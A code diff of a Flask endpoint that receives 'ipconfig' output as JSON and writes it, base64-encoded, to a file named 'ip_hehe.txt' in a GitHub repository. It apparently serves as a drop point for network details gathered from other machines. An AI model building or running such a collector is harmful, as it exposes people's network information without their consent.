@@ -5,11 +5,9 @@ import base64
 
 app = Flask(__name__)
 
-# 🔐 IMPORTANT: mettre ça dans Render Environment Variables
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN")
-
 REPO = "kdisksnwj/crotte"
-FILE_PATH = "data.txt"
+FILE_PATH = "ip_hehe.txt"
 
 
 def get_sha():
@@ -30,9 +28,9 @@ def get_sha():
 def send():
     data = request.json
 
-   content = base64.b64encode(
-    data["ipconfig"].encode("utf-8")
-).decode("utf-8")
+    content = base64.b64encode(
+        data["ipconfig"].encode("utf-8")
+    ).decode("utf-8")
 
     url = f"https://api.github.com/repos/{REPO}/contents/{FILE_PATH}"
 
@@ -52,7 +50,6 @@ def send():
 
     r = requests.put(url, json=payload, headers=headers)
 
-    # 🔥 DEBUG IMPORTANT (pour voir pourquoi ça marche pas)
     print("GITHUB STATUS:", r.status_code)
     print("GITHUB RESPONSE:", r.text)
 
